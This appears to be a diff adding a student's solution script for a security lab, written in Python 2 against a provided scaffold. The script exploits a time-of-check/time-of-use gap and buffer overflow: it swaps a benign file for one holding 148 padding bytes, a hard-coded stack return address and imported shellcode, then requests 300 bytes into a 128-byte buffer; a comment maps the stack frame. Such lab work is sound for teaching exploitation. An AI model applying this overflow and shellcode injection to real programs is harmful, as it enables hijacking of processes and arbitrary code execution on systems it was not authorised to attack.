@@ -1,0 +1,36 @@
+#!/usr/bin/env python2
+
+import scaffold as p
+from scaffold import SHELLCODE
+
+### YOUR CODE STARTS HERE ###
+
+with open('hack', 'w') as f:
+    f.write('To pass the big file if statement\n')
+
+p.start()
+
+assert p.recv(30) == 'How many bytes should I read? '
+
+with open('hack', 'w') as f:
+    f.write('B'*148 + '\x40\xd8\xff\xff' + SHELLCODE)
+
+p.send('300\n')
+#assert p.recv(18) == 'Here is the file!\n'
+#print p.recv(12)
+
+
+### YOUR CODE ENDS HERE ###
+'''
+                                Address   
+        [4]      RIP read_file  0xffffd83c
+        [4]      SFP read_file  0xffffd838
+        [128]    buf            0xffffd7a8
+        [4]      bytes_to_read  0xffffd7a4
+
+	Logic:
+	1. overwrite sfp to buff[88] by overwriting last	
+
+	
+'''
+	
